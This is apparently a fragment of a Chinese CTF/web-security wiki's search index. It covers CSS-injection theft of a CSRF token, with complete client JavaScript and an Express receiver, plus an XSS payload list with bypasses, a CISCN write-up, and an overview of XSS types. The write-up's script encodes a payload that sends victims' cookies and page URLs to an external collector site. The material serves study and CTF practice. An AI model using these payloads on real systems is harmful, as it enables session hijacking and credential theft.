<p>\u5b83\u7684\u601d\u8def\u662f\u524d\u7aefjs\u4f7f\u7528setTimeout\u5b9a\u65f6\u8bf7\u6c42\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u5c06css\u6ce8\u5165\u5f97\u5230\u7684token\u8fd4\u56de\u3002</p> <pre><code>&lt;html&gt;\n    &lt;style&gt;\n        #frames {\n            visibility: hidden;\n        }\n    &lt;/style&gt;\n    &lt;body&gt;\n        &lt;div id=\"current\"&gt;&lt;/div&gt;\n        &lt;div id=\"time_to_next\"&gt;&lt;/div&gt;\n        &lt;div id=\"frames\"&gt;&lt;/div&gt;\n    &lt;/body&gt;\n    &lt;script&gt;\n        vuln_url = 'http://127.0.0.1:8084/vuln.php?css=';\n        server_receive_token_url = 'http://127.0.0.1:8083/receive/';\n        server_return_token_url = 'http://127.0.0.1:8083/return';\n        chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\".split(\"\");\n        known = \"\";\n        function test_char(known, chars) {\n            // Remove all the frames\n            document.getElementById(\"frames\").innerHTML = \"\";\n            // Append the chars with the known chars\n            css = build_css(chars.map(v =&gt; known + v));\n            // Create an iframe to try the attack. If `X-Frame-Options` is blocking this you could use a new tab...\n            frame = document.createElement(\"iframe\");\n            frame.src = vuln_url + css;\n            frame.style=\"visibility: hidden;\"; //gotta be sneaky sneaky like\n            document.getElementById(\"frames\").appendChild(frame);\n            // in 1 seconds, after the iframe loads, check to see if we got a response yet\n            setTimeout(function() {\n                var oReq = new XMLHttpRequest();\n                oReq.addEventListener(\"load\", known_listener);\n                oReq.open(\"GET\", server_return_token_url);\n                oReq.send();\n            }, 1000);\n        }\n        function build_css(values) {\n            css_payload = \"\";\n            for(var value in values) {\n                css_payload += \"input[value^=\\\"\"\n                    + values[value]\n                    + \"\\\"]~*{background-image:url(\" \n                    + server_receive_token_url\n                    + values[value]\n                    + \")%3B}\"; //can't use an actual semicolon because that has a meaning in a url\n            }\n            return css_payload;\n        }\n        function known_listener () {\n            document.getElementById(\"current\").innerHTML = \"Current Token: \" + this.responseText;\n            if(known != this.responseText) {\n                known = this.responseText;\n                test_char(known, chars);\n            } else {\n                known = this.responseText;\n                alert(\"CSRF token is: \" + known);\n            }\n        }\n        test_char(\"\", chars);\n    &lt;/script&gt;\n&lt;/html&gt;\nPlain Text\n</code></pre> <pre><code>\u670d\u52a1\u5668\u4ee3\u7801\u662f\u6211\u914d\u5408\u5b83\u7684payload\u5199\u5f97\u3002\nvar express = require('express');\nvar app = express();\nvar path = require('path');\nvar token = \"\";\napp.get('/receive/:token', function(req, res) {\n    token = req.params.token;\n    console.log(token)\n    res.send('ok');\n});\napp.get('/return', function(req, res){\n    res.send(token);\n});\napp.get('/client.html', function(req, res){\n    res.sendFile(path.join(__dirname, 'client.html'));\n})\n\nvar server = app.listen(8083, function() {\n    var host = server.address().address\n    var port = server.address().port\n    console.log(\"Example app listening at http://%s:%s\", host, port)\n})\nPlain Text\n</code></pre> <p>\u8fd8\u6709\u5e08\u5085\u901a\u8fc7\u670d\u52a1\u5668\u5c06token\u5199\u5165\u5230cookie\u4e2d\uff0c \u5b9a\u65f6\u67e5\u8be2cookie\u662f\u5426\u6539\u53d8\u6765\u5b9e\u73b0\u7684\u3002</p> <p>\u8fd8\u53d1\u73b0\u6709\u5e08\u5085\u7528websocket\u5b9e\u73b0\u66f4\u4f18\u96c5\u4e00\u4e9b\u3002https://gist.github.com/cgvwzq/f7c55222fbde44fc686b17f745d0e1aa</p>"},{"location":"web/XSS_CSS_CSP/xss/CTF%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/","title":"CTF\u4e2d\u7684\u5229\u7528\u59ff\u52bf","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>CTF\u4e2dXSS\u4e00\u822c\u9700\u8981\u53d7\u5bb3\u8005\uff0c\u9700\u8981\u540e\u53f0\u5199\u4e1c\u897f\u6765\u70b9\u51fb\uff0c\u6709\u70b9\u9ebb\u70e6\uff0c\u6240\u4ee5\u8d44\u6599\u5c11\uff0c\u9898\u76ee\u5c11</p> <p>\u4f46\u5e76\u4e0d\u4ee3\u8868\u8fd9\u4e2a\u6f0f\u6d1e\u5c11\u89c1\uff0c\u76f8\u53cd\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u5f88\u5e38\u89c1\u3002</p> <p>\u7ed9\u51fa\u4e00\u4e9b\u7b80\u5355\u7684\uff1a</p> <pre><code>&lt;script&gt;alert(\"\u5185\u5bb9\")&lt;/script&gt;    \u4f7f\u7528&lt;script&gt;\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846\n&lt;body onload=alert(\"\u5185\u5bb9\")&gt;   \u4f7f\u7528&lt;body&gt;\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846\n&lt;a href=\u201c\u201d onclick=alert(\u201c\u5185\u5bb9\u201d)&gt;\u94fe\u63a5\u6587\u5b57&lt;/a&gt; \u4f7f\u7528&lt;a&gt;\u6807\u7b7e\uff0c\u663e\u793a\u53ef\u70b9\u51fb\u94fe\u63a5\uff0c\u70b9\u51fb\u94fe\u63a5\u540e\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846\n&lt;img src=WrongIP onerror=alert(\"\u5185\u5bb9\")&gt;   \u4f7f\u7528&lt;img&gt;\u6807\u7b7e\uff0c\u5f39\u51fa\u6d88\u606f\u5bf9\u8bdd\u6846\n&lt;script&gt;window.location.href=\"\u7f51\u7ad9\u5730\u5740\"&lt;/script&gt;    \u4f7f\u7528&lt;script&gt;\u6807\u7b7e\uff0c\u91cd\u5b9a\u5411\u9875\u9762\n&lt;script&gt;alert=(document.cookie)&lt;/script&gt;    \u4f7f\u7528&lt;script&gt;\u6807\u7b7e\uff0ccookie\u83b7\u53d6&lt;script&gt;\u6807\u7b7e\uff1a&lt;script&gt;\u6807\u7b7e\u662f\u6700\u76f4\u63a5\u7684XSS\u6709\u6548\u8f7d\u8377\uff0c\u811a\u672c\u6807\u8bb0\u53ef\u4ee5\u5f15\u7528\u5916\u90e8\u7684JavaScript\u4ee3\u7801\uff0c\u4e5f\u53ef\u4ee5\u5c06\u4ee3\u7801\u63d2\u5165\u811a\u672c\u6807\u8bb0\u4e2d\n\nsvg\u6807\u7b7e \n&lt;svg onload=\"alert(1)\"&gt;\n&lt;svg onload=\"alert(1)\"//\n&lt;img&gt;\u6807\u7b7e\uff1a\n&lt;img  src=1  \u03bfnerr\u03bfr=alert(\"hack\")&gt;\n&lt;img  src=1  \u03bfnerr\u03bfr=alert(document.cookie)&gt;  #\u5f39\u51facookie\n &lt;body&gt;\u6807\u7b7e\uff1a\n&lt;body \u03bfnl\u03bfad=alert(1)&gt;\n&lt;body \u03bfnpagesh\u03bfw=alert(1)&gt;\nvideo\u6807\u7b7e:\n&lt;video \u03bfnl\u03bfadstart=alert(1) src=\"/media/hack-the-planet.mp4\" /&gt;\nstyle\u6807\u7b7e\uff1a\n&lt;style \u03bfnl\u03bfad=alert(1)&gt;&lt;/style&gt;\nPlain Text\n</code></pre> <p></p> <p>\u7ecf\u5e38\u7528\u7684\u5c31\u8fd9\u4e9b\u3002\u3002\u3002\u3002\u3002\u3002\u800c\u4e14\u4e5f\u57fa\u672c\u591f\u7528</p> <p>\u9898\u76ee\u7c7b\u578b\u7684\u8bdd</p> <pre><code>\u7ed9\u7ba1\u7406\u5458\u53d1\u4e00\u6761\u7559\u8a00\u597d\u5417\uff1f\u2013\u5b58\u50a8\u578bxss(\u628a\u7ba1\u7406\u5458\u7684cookie\u6253\u5230\u81ea\u5df1\u7684\u5e73\u53f0)\n\u63d0\u4ea4\u7f51\u7ad9\u6f0f\u6d1e\uff0c\u53ea\u9650\u672c\u7ad9\u5185\u7684url\uff0c\u7ba1\u7406\u5458\u4f1a\u540e\u53f0\u67e5\u770b\u2013\u53cd\u5c04\u6027DOM XSS\uff08\u4f1a\u7ed9\u51fa\u4e00\u4e9b\u63d0\u793a\u201c\u6b27\uff0c\u662f\u7684\uff0c\u6211\u4e00\u5b9a\u4f1a\u67e5\u770b\u4f60\u4eec\u53d1\u6765\u7684\u7f51\u9875\u7684\u201d--by admin\uff09\uff08\u5982\u679c\u975e\u672c\u7ad9\uff0c\u5c31\u53d8\u6210\u4e86csrf\uff09\u52a8\u6001\u6267\u884cJavaScript\u8bed\u53e5\uff0c\u66f4\u6539dom\u6811\u7ed3\u6784\u2013DOM XSS\n\u52a0\u8f7d\u56fe\u7247\u5904\uff0c\u7f16\u8f91\u7528\u6237\u540d\u5904\u2013\u53cd\u5c04\u6027XSS\n\u8fdb\u96361\u2013&gt;\u7f13\u5b58\u6295\u6bd2XSS\u2013&gt;\u83b7\u53d6\u7ba1\u7406\u5458Cookie\n\u8fdb\u96362\u2013&gt;Bypass CSP\u2013&gt;\u83b7\u53d6\u7ba1\u7406\u5458Cookie\n\u51b7\u95e8\u2013&gt;XSS to RCE\u2013&gt;\u83b7\u53d6\u7cfb\u7edfflag\nPlain Text\n</code></pre> <p>XSS\u901a\u5e38\u90fd\u662f\u7ed3\u5408\u5176\u4ed6\u65b9\u9762\u7684\u6f0f\u6d1e\u6765\u5229\u7528</p> <p>\u6765\u7ec3\u4e60\u7ec3\u4e60\uff1f</p> <p>XSS\u5e73\u53f0|CTF\u6b22\u8fce\u6765\u5230XSS\u6311\u6218|XSS\u4e4b\u65c5|XSS\u6d4b\u8bd5</p> <p>XSS\u5e73\u53f0\uff0c\u4e3a\u54cd\u5e94\u56fd\u5bb6\u53f7\u53ec\uff0c\u5efa\u8bbe\u4e92\u8054\u7f51\u5b89\u5168\u5f3a\u56fd\uff0c\u6253\u9020\u5168\u6c11\u7f51\u7edc\u5b89\u5168\u5c16\u5175\uff0c\u6211\u4eec\u7279\u610f\u514d\u8d39\u7ed9\u767d\u5e3d\u5b50\u63d0\u4f9b\u4e86\u6e17\u900f\u6d4b\u8bd5\u4e13\u7528\u7684XSS\u5e73\u53f0\u3002\u6211\u4eec\u7684\u53e3\u53f7\u662f\uff0c\u77e5\u8bc6\uff0c\u4e0d\u4f1a\u56e0\u4e3a\u4f60\u7684\u5206\u4eab\u800c\u843d\u540e\u4e8e\u522b\u4eba\uff0c\u5979\u53ea\u4f1a\u8ba9\u4f60\u66f4\u8fdb\u6b65\uff0c\u4e2d\u534e\u6c11\u65cf\uff0c\u534e\u590f\u513f\u5973\uff0c\u56e2\u7ed3\u8d77\u6765\uff0c\u5171\u7b51\u4e2d\u56fd\u7f51\u7edc\u5b89\u5168\u957f\u57ce\uff01</p> <p>http://test.xss.tv/</p> <p>\u5176\u4ed6\u7ed5\u8fc7\u7684\u8bdd\uff0c\u672c\u4eba\u59ff\u52bf\u4e0d\u591f\uff0c\u671f\u5f85\u8865\u5145</p> <p>XSS\u63d2\u5165\u7ed5\u8fc7\u4e00\u4e9b\u65b9\u5f0f\u603b\u7ed3_weixin_38167826\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <p>\u8be6\u89c1\uff1ahttp://blog.csdn.net/keepxp/article/details/520543881\u5e38\u89c4\u63d2\u5165\u53ca\u5176\u7ed5\u8fc71.1 Script \u6807\u7b7e\u7ed5\u8fc7\u8fdb\u884c\u4e00\u6b21\u79fb\u9664\u64cd\u4f5c\uff1a &lt;scr&lt;script&gt;ipt&gt;alert(\"XSS\")&lt;/scr&lt;script&gt;ipt&gt; Script \u6807\u7b7e\u53ef\u4ee5\u7528\u4e8e\u5b9a\u4e49\u4e00\u4e2a\u884c\u5185\u7684\u811a\u672c\u6216\u8005\u4ece\u5176...</p> <p>https://blog.csdn.net/weixin_38167826/article/details/99759505</p>"},{"location":"web/XSS_CSS_CSP/xss/CTF%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF/#markup","title":"markup\u8f6c\u7801","text":"<p>Markup\u65b9\u6cd5\u662f\u5bf9HTML\u7684\u4e00\u79cd\u5b89\u5168\u6807\u8bb0\uff0c\u5e76\u5c06\u5176\u8f6c\u5316\u4e3astr\u7c7b\u578b</p> <p>\u5176\u76ee\u7684\u662f\u4e3a\u4e86\u9632\u6b62XSS\u653b\u51fb</p> <p>\u62ff\u4e2a\u4f8b\u9898\u51fa\u6765</p> <p>[CISCN-\u534e\u4e1c\u5317\u8d5b\u533aWeb]-XSS</p> <p></p> <p></p> <p>OK,\u5173\u952e\u5b57\uff0cadmin\u5927\u4eba\u7684\u5ba1\u6838</p> <p></p> <p>\u8fd8\u6709URL\u53ef\u4ee5\u63d0\u4ea4</p> <p>\u81f3\u4e8e\u4e0b\u9762\u7684\u4f1a\u7528\u5230\u811a\u672c\uff1amd5\u622a\u65ad\u7206\u7834</p> <p>\u7ed3\u5408\u6807\u9898\u518d\u770b\u770b\u8fd9\u4e24\u4e2a\u9875\u9762\uff0c\u6295\u7a3f\u9875\u9762\u662f\u7528\u6765\u653eXSS\u7684\uff0c\u7136\u540e\u5728\u53cd\u9988\u7ed9\u7ba1\u7406\u5458\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u62ff\u5230\u7ba1\u7406\u5458\u7684cookie\uff0c\u56e0\u4e3a\u8fd9\u91cc\u662f\u5185\u7f51\u73af\u5883\uff0c\u6240\u4ee5\u53ea\u80fd\u53bbhttp://xss.buuoj.cn\u6ce8\u518c\u8d26\u53f7\u6765\u63a5\u6536cookie\u3002</p> <p>\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u63d0\u4ea4\u7684\u5185\u5bb9\u90e8\u5206\u4f1a\u88ab\u8f6c\u4e49\uff0c\u53ef\u4ee5\u5148\u5c06\u63d0\u4ea4\u7684\u5185\u5bb9\u7528HTML Markup\u8f6c\u4e2a\u7801\uff0c\u7136\u540e\u7528eval\u6765\u6267\u884cJS\u4ee3\u7801\uff0c\u800c\u4e14\u8fd9\u91cc\u9700\u8981\u7528window.location.href\u6765\u5237\u65b0\u9875\u9762\u81ea\u52a8\u89e6\u53d1\u3002</p> <p>markup\u8f6c\u7801\u811a\u672c</p> <pre><code>import markup\nxss =\"(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=odd1Xf&amp;location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&amp;opener='+escape((function(){try{return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();\"\noutput = \"\"\nfor c in xss:\n    output += \"&amp;#\" + str(ord(c))\nprint(\"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34\" + output + \"&amp;#34&amp;#41&lt;/script&gt;\")\nPlain Text\n</code></pre> <p>\u5728\u7f51\u7ad9\u4e0a\u63a5\u53d7\u5230\u5f39\u56de\u6765\u7684cookie\u540e\uff0c\u5229\u7528cookie\u767b\u5f55\uff0cOK</p> <p>\u540e\u9762\u8fd8\u6709\u4e2asql\u6ce8\u5165\uff0c\u4e0d\u8fc7\u6ca1\u8fc7\u6ee4\uff0c\u975e\u5e38\u7b80\u5355\u3002</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/","title":"XSS","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5176\u5b9e\u6211\u662f\u60f3\u548cCSRF\u653e\u5728\u4e00\u8d77\u7684\uff0c\u6bd5\u7adf\u5f88\u50cf</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#cross-site-scripting","title":"\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08Cross Site Scripting\uff09","text":"<p>\u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08XSS\uff09\uff0c\u662f\u6700\u666e\u904d\u7684Web\u5e94\u7528\u5b89\u5168\u6f0f\u6d1e\u3002\u8fd9\u7c7b\u6f0f\u6d1e\u80fd\u591f\u4f7f\u5f97\u653b\u51fb\u8005\u5d4c\u5165\u6076\u610f\u811a\u672c\u4ee3\u7801\u5230\u6b63\u5e38\u7528\u6237\u4f1a\u8bbf\u95ee\u5230\u7684\u9875\u9762\u4e2d\uff0c\u5f53\u6b63\u5e38\u7528\u6237\u8bbf\u95ee\u8be5\u9875\u9762\u65f6\uff0c\u5219\u53ef\u5bfc\u81f4\u5d4c\u5165\u7684\u6076\u610f\u811a\u672c\u4ee3\u7801\u7684\u6267\u884c\uff0c\u4ece\u800c\u8fbe\u5230\u6076\u610f\u653b\u51fb\u7528\u6237\u7684\u76ee\u7684\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6237\u5728\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u5176\u9884\u5b9a\u4e49\u7684\u6076\u610f\u811a\u672c\uff0c\u5176\u5bfc\u81f4\u7684\u5371\u5bb3\u53ef\u60f3\u800c\u77e5\uff0c\u5982\u52ab\u6301\u7528\u6237\u4f1a\u8bdd\uff0c\u63d2\u5165\u6076\u610f\u5185\u5bb9\u3001\u91cd\u5b9a\u5411\u7528\u6237\u3001\u4f7f\u7528\u6076\u610f\u8f6f\u4ef6\u52ab\u6301\u7528\u6237\u6d4f\u89c8\u5668\u3001\u7e41\u6b96XSS\u8815\u866b\uff0c\u751a\u81f3\u7834\u574f\u7f51\u7ad9\u3001\u4fee\u6539\u8def\u7531\u5668\u914d\u7f6e\u4fe1\u606f\u7b49\u3002</p> <p>\u4e5f\u6709\u4eba\u8bf4\u8fd9\u4e2a\u6f0f\u6d1e\u6316\u6398\u5c31\u662f\u770b\u4f60JS\u597d\u4e0d\u597d</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#_1","title":"\u539f\u7406","text":"<p>HTML\u662f\u4e00\u79cd\u8d85\u6587\u672c\u6807\u8bb0\u8bed\u8a00\uff0c\u901a\u8fc7\u5c06\u4e00\u4e9b\u5b57\u7b26\u7279\u6b8a\u5730\u5bf9\u5f85\u6765\u533a\u522b\u6587\u672c\u548c\u6807\u8bb0\uff0c\u4f8b\u5982\uff0c\u5c0f\u4e8e\u7b26\u53f7\uff08&lt;\uff09\u88ab\u770b\u4f5c\u662fHTML\u6807\u7b7e\u7684\u5f00\u59cb\uff0c\u4e0e\u4e4b\u95f4\u7684\u5b57\u7b26\u662f\u9875\u9762\u7684\u6807\u9898\u7b49\u7b49\u3002\u5f53\u52a8\u6001\u9875\u9762\u4e2d\u63d2\u5165\u7684\u5185\u5bb9\u542b\u6709\u8fd9\u4e9b\u7279\u6b8a\u5b57\u7b26\uff08\u5982&lt;\uff09\u65f6\uff0c\u7528\u6237\u6d4f\u89c8\u5668\u4f1a\u5c06\u5176\u8bef\u8ba4\u4e3a\u662f\u63d2\u5165\u4e86HTML\u6807\u7b7e\uff0c\u5f53\u8fd9\u4e9bHTML\u6807\u7b7e\u5f15\u5165\u4e86\u4e00\u6bb5JavaScript\u811a\u672c\u65f6\uff0c\u8fd9\u4e9b\u811a\u672c\u7a0b\u5e8f\u5c31\u5c06\u4f1a\u5728\u7528\u6237\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u3002\u6240\u4ee5\uff0c\u5f53\u8fd9\u4e9b\u7279\u6b8a\u5b57\u7b26\u4e0d\u80fd\u88ab\u52a8\u6001\u9875\u9762\u68c0\u67e5\u6216\u68c0\u67e5\u51fa\u73b0\u5931\u8bef\u65f6\uff0c\u5c31\u5c06\u4f1a\u4ea7\u751fXSS\u6f0f\u6d1e\u3002</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#_2","title":"\u7c7b\u578b","text":"<p>\u4ece\u653b\u51fb\u4ee3\u7801\u7684\u5de5\u4f5c\u65b9\u5f0f\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u7c7b\u578b\uff1a</p> <p>\uff081\uff09\u6301\u4e45\u578b\u8de8\u7ad9\uff1a\u6700\u76f4\u63a5\u7684\u5371\u5bb3\u7c7b\u578b\uff0c\u8de8\u7ad9\u4ee3\u7801\u5b58\u50a8\u5728\u670d\u52a1\u5668\uff08\u6570\u636e\u5e93\uff09\u3002</p> <p>\uff082\uff09\u975e\u6301\u4e45\u578b\u8de8\u7ad9\uff1a\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e\uff0c\u6700\u666e\u904d\u7684\u7c7b\u578b\u3002\u7528\u6237\u8bbf\u95ee\u670d\u52a1\u5668-\u8de8\u7ad9\u94fe\u63a5-\u8fd4\u56de\u8de8\u7ad9\u4ee3\u7801\u3002</p> <p>\uff083\uff09DOM\u8de8\u7ad9\uff08DOM XSS\uff09\uff1aDOM\uff08document object model\u6587\u6863\u5bf9\u8c61\u6a21\u578b\uff09\uff0c\u5ba2\u6237\u7aef\u811a\u672c\u5904\u7406\u903b\u8f91\u5bfc\u81f4\u7684\u5b89\u5168\u95ee\u9898\u3002</p> <p>\u57fa\u4e8eDOM\u7684XSS\u6f0f\u6d1e\u662f\u6307\u53d7\u5bb3\u8005\u7aef\u7684\u7f51\u9875\u811a\u672c\u5728\u4fee\u6539\u672c\u5730\u9875\u9762DOM\u73af\u5883\u65f6\u672a\u8fdb\u884c\u5408\u7406\u7684\u5904\u7f6e\uff0c\u800c\u4f7f\u5f97\u653b\u51fb\u811a\u672c\u88ab\u6267\u884c\u3002\u5728\u6574\u4e2a\u653b\u51fb\u8fc7\u7a0b\u4e2d\uff0c\u670d\u52a1\u5668\u54cd\u5e94\u7684\u9875\u9762\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316\uff0c\u5f15\u8d77\u5ba2\u6237\u7aef\u811a\u672c\u6267\u884c\u7ed3\u679c\u5dee\u5f02\u7684\u539f\u56e0\u662f\u5bf9\u672c\u5730DOM\u7684\u6076\u610f\u7be1\u6539\u5229\u7528\u3002</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#_3","title":"\u653b\u51fb\u65b9\u5f0f","text":"<p>\u5e38\u7528\u7684XSS\u653b\u51fb\u624b\u6bb5\u548c\u76ee\u7684\u6709\uff1a</p> <p>1\u3001\u76d7\u7528cookie\uff0c\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3002</p> <p>2\u3001\u5229\u7528\u690d\u5165Flash\uff0c\u901a\u8fc7crossdomain\u6743\u9650\u8bbe\u7f6e\u8fdb\u4e00\u6b65\u83b7\u53d6\u66f4\u9ad8\u6743\u9650\uff1b\u6216\u8005\u5229\u7528Java\u7b49\u5f97\u5230\u7c7b\u4f3c\u7684\u64cd\u4f5c\u3002</p> <p>3\u3001\u5229\u7528iframe\u3001frame\u3001XMLHttpRequest\u6216\u4e0a\u8ff0Flash\u7b49\u65b9\u5f0f\uff0c\u4ee5\uff08\u88ab\u653b\u51fb\uff09\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u4e00\u4e9b\u7ba1\u7406\u52a8\u4f5c\uff0c\u6216\u6267\u884c\u4e00\u4e9b\u4e00\u822c\u7684\u5982\u53d1\u5fae\u535a\u3001\u52a0\u597d\u53cb\u3001\u53d1\u79c1\u4fe1\u7b49\u64cd\u4f5c\u3002</p> <p>4\u3001\u5229\u7528\u53ef\u88ab\u653b\u51fb\u7684\u57df\u53d7\u5230\u5176\u4ed6\u57df\u4fe1\u4efb\u7684\u7279\u70b9\uff0c\u4ee5\u53d7\u4fe1\u4efb\u6765\u6e90\u7684\u8eab\u4efd\u8bf7\u6c42\u4e00\u4e9b\u5e73\u65f6\u4e0d\u5141\u8bb8\u7684\u64cd\u4f5c\uff0c\u5982\u8fdb\u884c\u4e0d\u5f53\u7684\u6295\u7968\u6d3b\u52a8\u3002</p> <p>5\u3001\u5728\u8bbf\u95ee\u91cf\u6781\u5927\u7684\u4e00\u4e9b\u9875\u9762\u4e0a\u7684XSS\u53ef\u4ee5\u653b\u51fb\u4e00\u4e9b\u5c0f\u578b\u7f51\u7ad9\uff0c\u5b9e\u73b0DDoS\u653b\u51fb\u7684\u6548\u679c\u3002</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#_4","title":"XSS","text":"<p>\uff08\u4ee5\u4e0a\u6458\u81ea\u767e\u5ea6\u767e\u79d1\uff09</p> <p>\u60f3\u8c61\u4e00\u4e0b\uff0c\u5f53\u6709\u4e00\u5929\u4f60\u6b63\u5728\u7f51\u5361\u5feb\u4e50\u7684\u51b2\u7740\u6d6a\uff0c\u521a\u521a\u53d1\u5230\u5de5\u8d44\u7684\u4f60\u767b\u5f55\u4e86XX\u94f6\u884c\u7684\u7f51\u7ad9\uff0c\u7f51\u9875\u53f3\u4e0b\u89d2\u7a81\u7136\u5f39\u51fa\u4e00\u4e2a\u4e0d\u8d77\u773c\u7684\u5f39\u6846\uff0c\u4f60\u70b9\u51fb\u5b83\u60f3\u628a\u5b83\u5173\u6389\u7ed3\u679c\u4e0d\u5c0f\u5fc3\u6253\u5f00\u3002\u7136\u540e\u7a81\u7136\u4f20\u51fa\u6d88\u606f\uff1a\u4f60\u5df2\u8f6c\u8d26XXX\u5143.......</p> <p>\u603b\u7684\u6765\u8bf4XSS\u6f0f\u6d1e\u5371\u5bb3\u6027\u8fd8\u662f\u86ee\u5927\u7684\u3002\u540c\u6837\u7684\uff0c\u6211\u4eec\u4e5f\u9762\u4e34\u7740\u5f3a\u5927\u7684\u5404\u79cd\u8fc7\u6ee4\u624b\u6bb5\u3002</p> <p>\u5982\u4f55\u7ed5\u8fc7\u8fd9\u4e9b\u624b\u6bb5\u662f\u6211\u4eec\u7684\u5b66\u4e60\u7684\u76ee\u7684\u3002</p> <p></p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#xss_1","title":"XSS\u7684\u4e09\u79cd\u65b9\u6cd5","text":"<p>XSS\u7684\u7b80\u4ecb</p> <p>\u60f3\u5b66\u4e60\u7684\u8bdd\u62ffDVWA\u53ef\u4ee5\u81ea\u5df1\u6162\u6162\u8bd5</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#xss_2","title":"\u53cd\u5c04\u578bxss","text":"<p>\u53cd\u5c04XSS\u662fXSS\u5206\u7c7b\u4e2d\u6700\u591a\u7684\uff0c\u4ed6\u4eec\u539f\u7406\u662f\u4e0b\u9762\u8fd9\u6837\uff1a</p> <p>Hacker\u2014\u2014\u53d1\u73b0\u5b58\u5728\u53cd\u5c04XSS\u7684URL\u2014\u2014\u6839\u636e\u8f93\u51fa\u70b9\u7684\u73af\u5883\u6784\u9020XSS\u4ee3\u7801\u2014\u2014\u8fdb\u884c\u7f16\u7801\u3001\u7f29\u77ed(\u53ef\u6709\u53ef\u65e0\uff0c\u662f\u4e3a\u4e86\u589e\u52a0\u8ff7\u60d1\u6027)\u2014\u2014\u53d1\u9001\u7ed9\u53d7\u5bb3\u4eba\u2014\u2014\u53d7\u5bb3\u6253\u5f00\u540e\uff0c\u6267\u884cXSS\u4ee3\u7801\u2014\u2014\u5b8c\u6210hacker\u60f3\u8981\u7684\u529f\u80fd(\u83b7\u53d6cookies\u3001url\u3001\u6d4f\u89c8\u5668\u4fe1\u606f\u3001IP\u7b49\u7b49)</p> <p>\u6253\u4e2a\u6bd4\u65b9\uff1a</p> <p>A\u7f51\u7ad9\u6709\u4e2aXSS\uff0c\u9ed1\u5ba2\u5199\u4e86\u4e00\u4e2aB\u7f51\u7ad9\uff0c\u53d7\u5bb3\u8005\u8bbf\u95eeB\u7f51\u7ad9\u7684\u65f6\u5019\u4f1a\u8df3\u5230A\u7f51\u7ad9\u5e76\u4e14\u8fd4\u56de\u4fe1\u606f\u7ed9\u9ed1\u5ba2\u3002</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#xss_3","title":"\u5b58\u50a8\u578bXSS","text":"<p>\u5229\u7528\u90fd\u662f\u63d2\u5165\u4ee3\u7801\u5230HTML\u4e4b\u4e2d\uff0c\u53cd\u5c04\u578b\u662f\u4e00\u90e8\u5206\uff0c\u7b49\u7740\u9493\u9c7c\u3002</p> <p>\u5b58\u50a8\u578b\u5c31\u7b49\u7740\u522b\u4eba\u70b9\u8fd9\u4e2a\u7f51\u9875\u5c31\u884c\u4e86\u3002</p>"},{"location":"web/XSS_CSS_CSP/xss/XSS/#domxss","title":"DOM\u578bXSS","text":"<p>DOM\uff0c\u5168\u79f0Document Object Model\uff0c\u662f\u4e00\u4e2a\u5e73\u53f0\u548c\u8bed\u8a00\u90fd\u4e2d\u7acb\u7684\u63a5\u53e3\uff0c\u53ef\u4ee5\u4f7f\u7a0b\u5e8f\u548c\u811a\u672c\u80fd\u591f\u52a8\u6001\u8bbf\u95ee\u548c\u66f4\u65b0\u6587\u6863\u7684\u5185\u5bb9\u3001\u7ed3\u6784\u4ee5\u53ca\u6837\u5f0f\u3002</p> <p></p> <p>DOM\u578bXSS\u5176\u5b9e\u662f\u4e00\u79cd\u7279\u6b8a\u7c7b\u578b\u7684\u53cd\u5c04\u578bXSS\uff0c\u5b83\u662f\u57fa\u4e8eDOM\u6587\u6863\u5bf9\u8c61\u6a21\u578b\u7684\u4e00\u79cd\u6f0f\u6d1e\u3002\u5728\u7f51\u7ad9\u9875\u9762\u4e2d\u6709\u8bb8\u591a\u9875\u9762\u7684\u5143\u7d20\uff0c\u5f53\u9875\u9762\u5230\u8fbe\u6d4f\u89c8\u5668\u65f6\u6d4f\u89c8\u5668\u4f1a\u4e3a\u9875\u9762\u521b\u5efa\u4e00\u4e2a\u9876\u7ea7\u7684Document 